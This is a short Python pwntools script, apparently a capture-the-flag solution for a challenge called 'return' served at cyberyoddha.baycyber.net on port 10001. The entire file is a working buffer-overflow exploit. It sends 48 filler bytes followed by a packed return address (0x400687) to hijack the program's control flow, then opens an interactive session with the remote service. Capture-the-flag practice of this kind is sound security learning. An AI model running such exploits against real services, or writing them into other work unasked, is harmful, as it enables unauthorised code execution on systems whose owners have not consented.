from pwn import *
ip   = 'cyberyoddha.baycyber.net'
prot = 10001
r = remote(ip, prot)
#r = process("./return")

r.recvuntil("ubuntu 18.04.")
r.sendline(b"A" * 48 + p64(0x400687))

r.interactive()